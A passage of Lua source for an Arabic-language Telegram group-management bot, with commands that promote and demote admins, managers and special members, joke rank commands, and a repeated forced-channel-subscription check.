local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
function Function_Neverland(extra, result, success)
database:srem(bot_id.."Neverland:Manager"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","*✦┇تم تنزيله من المدراء*")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end  
if text and text:match("^تنزيل مدير @(.*)$") and Constructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local username = text:match("^تنزيل مدير @(.*)$")
function Function_Neverland(extra, result, success)
if result.id_ then
database:srem(bot_id.."Neverland:Manager"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","*✦┇تم تنزيله من المدراء*")  
else
send(msg.chat_id_, msg.id_,"✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end  
if text and text:match("^تنزيل مدير (%d+)$") and Constructor(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local userid = text:match("^تنزيل مدير (%d+)$") 
database:srem(bot_id.."Neverland:Manager"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","✦┇تم تنزيله من المدراء")  
return false
end

if text == ("رفع ادمن") and tonumber(msg.reply_to_message_id_) ~= 0 and Owner(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if not Constructor(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'*✦┇تم تعطيل الرفع*')
return false
end
function Function_Neverland(extra, result, success)
database:sadd(bot_id.."Neverland:Mod:User"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","*✦┇تم رفعه ادمن*")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end
if text and text:match("^رفع ادمن @(.*)$") and Owner(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local username = text:match("^رفع ادمن @(.*)$")
if not Constructor(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'*✦┇تم تعطيل الرفع*')
return false
end
function Function_Neverland(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"✦┇عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id.."Neverland:Mod:User"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","✦┇تم رفعه ادمن")  
else
send(msg.chat_id_, msg.id_,"✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end
if text and text:match("^رفع ادمن (%d+)$") and Owner(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local userid = text:match("^رفع ادمن (%d+)$")
if not Constructor(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'*✦┇تم تعطيل الرفع*')
return false
end
database:sadd(bot_id.."Neverland:Mod:User"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","*✦┇تم رفعه ادمن*")  
return false
end
if text == ("تنزيل ادمن") and tonumber(msg.reply_to_message_id_) ~= 0 and Owner(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
function Function_Neverland(extra, result, success)
database:srem(bot_id.."Neverland:Mod:User"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","✦┇تم تنزيله من ادمنيه المجموعه")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end
if text and text:match("^تنزيل ادمن @(.*)$") and Owner(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local username = text:match("^تنزيل ادمن @(.*)$") 
function Function_Neverland(extra, result, success)
if result.id_ then
database:srem(bot_id.."Neverland:Mod:User"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","✦┇تم تنزيله من ادمنيه المجموعه")  
else
send(msg.chat_id_, msg.id_,"✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end
if text and text:match("^تنزيل ادمن (%d+)$") and Owner(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local userid = text:match("^تنزيل ادمن (%d+)$")
database:srem(bot_id.."Neverland:Mod:User"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","✦┇تم تنزيله من ادمنيه المجموعه")  
return false
end

if text == ("رفع مميز") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if not Constructor(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'*✦┇تم تعطيل الرفع*')
return false
end
function Function_Neverland(extra, result, success)
database:sadd(bot_id.."Neverland:Special:User"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","*✦┇تم رفعه مميز*")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end
if text and text:match("^رفع مميز @(.*)$") and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local username = text:match("^رفع مميز @(.*)$") 
if not Constructor(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'*✦┇تم تعطيل الرفع*')
return false
end
function Function_Neverland(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"✦┇عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id.."Neverland:Special:User"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","*✦┇تم رفعه مميز*")  
else
send(msg.chat_id_, msg.id_,"✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end

if text and text:match("^رفع مميز (%d+)$") and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local userid = text:match("^رفع مميز (%d+)$")
if not Constructor(msg) and database:get(bot_id.."Add:Group:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'*✦┇تم تعطيل الرفع*')
return false
end
database:sadd(bot_id.."Neverland:Special:User"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","*✦┇تم ترقيته مميز في المجموعة.*")  
return false
end

if (text == ("تنزيل مميز")) and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
function Function_Neverland(extra, result, success)
database:srem(bot_id.."Neverland:Special:User"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","✦┇تم تنزيله من المميزين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end
if text and text:match("^تنزيل مميز @(.*)$") and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local username = text:match("^تنزيل مميز @(.*)$") 
function Function_Neverland(extra, result, success)
if result.id_ then
database:srem(bot_id.."Neverland:Special:User"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","✦┇تم تنزيله من المميزين")  
else
send(msg.chat_id_, msg.id_,"✦┇لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end
if text and text:match("^تنزيل مميز (%d+)$") and Addictive(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local userid = text:match("^تنزيل مميز (%d+)$") 
database:srem(bot_id.."Neverland:Special:User"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","✦┇تم تنزيله من المميزين")  
return false
end  

---------
if text == ("رفع اثول") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then   
function start_function(extra, result, success)
database:sadd(bot_id..'Athol:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✦┇تم رفع العضو اثول في المجموعة 😭😹💞'
local  statuss  = ''
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if (text == ("تنزيل اثول")) and msg.reply_to_message_id_ and Addictive(msg) then   
function start_function(extra, result, success)
database:srem(bot_id..'Athol:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✦┇تم تنزيل العضو اثول في المجموعة 😭😹💞'
status  = ''
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text == ("رفع نبي") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then   
function start_function(extra, result, success)
database:sadd(bot_id..'Naby:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✦┇رفعتلكم نبي جديد استقبلو 😹😭💞'
local  statuss  = ''
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if (text == ("تنزيل نبي")) and msg.reply_to_message_id_ and Addictive(msg) then   
function start_function(extra, result, success)
database:srem(bot_id..'Naby:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✦┇متستاهل النبوه نزلتك 😹😭💞'
status  = ''
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text == ("رفع بكلبي") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then   
function start_function(extra, result, success)
database:sadd(bot_id..'Galby:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✦┇رفعتك بكلبي لتجرحني 😘😭💞'
local  statuss  = ''
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if (text == ("تنزيل بكلبي")) and msg.reply_to_message_id_ and Addictive(msg) then   
function start_function(extra, result, success)
database:srem(bot_id..'Galby:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✦┇مو كتلك لتجرحني نزلتك من كلبي 😭💞'
status  = ''
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text == ("رفع تاج") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then   
function start_function(extra, result, success)
database:sadd(bot_id..'Tag:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✦┇هو تاج ميحتاج ارفعه 🤴🏻💞'
local  statuss  = ''
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if (text == ("تنزيل تاج")) and msg.reply_to_message_id_ and Addictive(msg) then   
function start_function(extra, result, success)
database:srem(bot_id..'Tag:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✦┇التاج ماينزل من مكانه 🤴🏻💞'
status  = ''
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text == ("زواج") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then   
function start_function(extra, result, success)
database:sadd(bot_id..'Zoag:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✦┇نزوج وماتباوع على غيري 🥺💞'
local  statuss  = ''
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text == ("طلاق") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then   
function start_function(extra, result, success)
database:sadd(bot_id..'Mote:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✦┇طالق طالق طالق بالعشرة 😹😭💞'
local  statuss  = ''
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text == ("رفع مطي") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then   
function start_function(extra, result, success)
database:sadd(bot_id..'Mote:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✦┇تم رفع العضو مطي في المجموعة 😭😹💞'
local  statuss  = ''
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if (text == ("تنزيل مطي")) and msg.reply_to_message_id_ and Addictive(msg) then
function start_function(extra, result, success)
database:srem(bot_id..'Mote:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✦┇تم تنزيل العضو مطي في المجموعة 😭😹💞'
status  = ''
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text == ("رفع زاحف") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then   
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✦┇تم رفع العضو زاحف في المجموعة 😭😹💞'
local  statuss  = ''
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if (text == ("تنزيل زاحف")) and msg.reply_to_message_id_ and Addictive(msg) then   
function start_function(extra, result, success)
database:srem(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n✦┇تم تنزيل العضو زاحف في المجموعة 😭😹💞'
status  = ''
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'تنزيل الحاتات' and Owner(msg) then
database:del(bot_id..'Ownere:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ✦┇تم مسح جميع المطايه')
end
if text == ("تاك للحاتات") and Owner(msg) then
local list = database:smembers(bot_id..'Ownere:User'..msg.chat_id_)
t = "\n ✦┇قائمه حاتات الكروب \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» الحاته [@"..username.."]\n"
else
t = t..""..k.."» الحاته `"..v.."`\n"
end
end
if #list == 0 then
t = " ✦┇مع الاسف لا يوجد حاته"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع الحاته") and tonumber(msg.reply_to_message_id_) ~= 0 and Owner(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ✦┇لا تستطيع استخدام البوت \n  ✦┇يرجى الاشتراك بالقناه اولا \n  ✦┇اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' *✦┇تم تعطيل الرفع*') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Ownere:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ✦┇العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n ✦┇تم رفع العضــو الحاته في الكروب \n ✦┇تعال يحاته ممكن نتعرف'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل الحاته")) and msg.reply_to_message_id_ and Owner(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
